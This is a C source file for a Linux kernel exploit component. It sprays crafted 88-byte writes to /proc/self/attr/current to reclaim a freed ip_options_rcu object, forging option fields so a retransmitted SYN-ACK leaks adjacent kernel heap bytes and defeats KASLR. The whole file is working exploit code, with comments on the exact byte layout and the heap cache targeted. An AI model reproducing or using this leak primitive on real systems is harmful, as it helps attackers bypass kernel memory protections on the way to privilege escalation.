/* leakspray.c - KASLR-bypass infoleak: reclaim the freed ip_options_rcu with
 * a PASSIVE leak object; the retransmit SYN-ACK then echoes the reclaimed
 * object AND its heap neighbor back to our raw socket.
 *
 * Primitive: proc_pid_attr_write -> memdup_user (arbitrary bytes incl NUL,
 * byte-exact, buffer IS the object). Unprivileged (write own
 * /proc/self/attr/current), freed on the AppArmor parse error -> fast churn.
 *
 * Leak payload (object = buf, fake ip_options at object+16):
 *   optlen @24 = 126 -> ip_options_build copies 126 bytes from object+32 into
 *                       the SYN-ACK: object+32..95 (filler) + NEIGHBOR bytes
 *                       object+96..+157 (the leak). The copy ends at iph+146,
 *                       before shinfo (iph+164) -> no corruption.
 *   srr/rr/ts @25..27 = 0, flags @28 = 0 -> NO OOB writes (passive, no crash).
 *
 * The echoed bytes appear in the received SYN-ACK at iph+20..+145; a raw
 * socket reads them regardless of the (garbage) TCP header.
 *
 * Usage: ./leakspray <runtime_s> [cpu]   (run as root in the lab for the raw
 * side; the reclaim primitive itself is unprivileged)
 */
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <sched.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <unistd.h>

#define ATTR "/proc/self/attr/current"
#define CNT 88   /* alloc = 88 bytes -> kmalloc-96 */

int main(int argc, char **argv) {
    int runtime = argc > 1 ? atoi(argv[1]) : 30;
    int cpu = argc > 2 ? atoi(argv[2]) : 0;
    const char *path = argc > 3 ? argv[3] : ATTR;
    cpu_set_t s;
    CPU_ZERO(&s);
    CPU_SET(cpu, &s);
    sched_setaffinity(0, sizeof(s), &s);

    unsigned char buf[CNT];
    memset(buf, 0x44, sizeof(buf));   /* 'D' filler */
    if (argc > 4 && !strcmp(argv[4], "churn")) {
        /* string-mode primitive (kstrdup/kstrndup paths): no NULs allowed */
        memset(buf, 0x41, sizeof(buf));
    } else {
        buf[24] = 126;   /* optlen: echo object+32..+157 (into the neighbor) */
        buf[25] = 0;     /* srr = 0  -> no srr write */
        buf[26] = 0;     /* rr  = 0  */
        buf[27] = 0;     /* ts  = 0  */
        buf[28] = 0;     /* flags = 0 -> no rr/ts writes */
    }
    /* marker so the sniffer recognizes a leak packet: object+32.. = 0x44 */

    unsigned long n = 0, err = 0;
    time_t t0 = time(NULL);
    while ((int)(time(NULL) - t0) < runtime) {
        for (int i = 0; i < 256; i++) {
            int fd = open(path, O_WRONLY);
            if (fd < 0) { err++; continue; }
            ssize_t r = write(fd, buf, sizeof(buf));
            close(fd);
            if (r < 0) err++; else n++;
        }
    }
    fprintf(stderr, "[leak %s] writes=%lu err=%lu\n", path, n, err);
    return 0;
}
